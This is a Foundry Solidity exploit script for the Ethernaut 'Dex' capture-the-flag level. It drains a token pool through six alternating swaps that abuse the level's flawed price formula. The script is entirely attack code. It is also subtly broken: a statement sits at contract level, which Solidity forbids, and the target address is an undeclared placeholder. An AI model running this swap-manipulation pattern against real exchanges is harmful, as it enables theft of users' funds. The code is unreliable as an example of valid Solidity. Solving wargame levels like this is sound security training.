// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/22_Dex.sol";

contract ExploitScript is Script {
    Dex level22 = Dex(payable(your_challenge_address));
    address token1 = level22.token1();
    address token2 = level22.token2();
    IERC20(token1).balanceOf(address(this));
    function run() external {
        vm.startBroadcast();
        
        level22.approve(address(level22), type(uint).max);
        level22.swap(token1, token2, 10);
        level22.swap(token2, token1, 20);
        level22.swap(token1, token2, 24);
        level22.swap(token2, token1, 30);
        level22.swap(token1, token2, 41);
        level22.swap(token2, token1, 45);

        vm.stopBroadcast();
    }
}
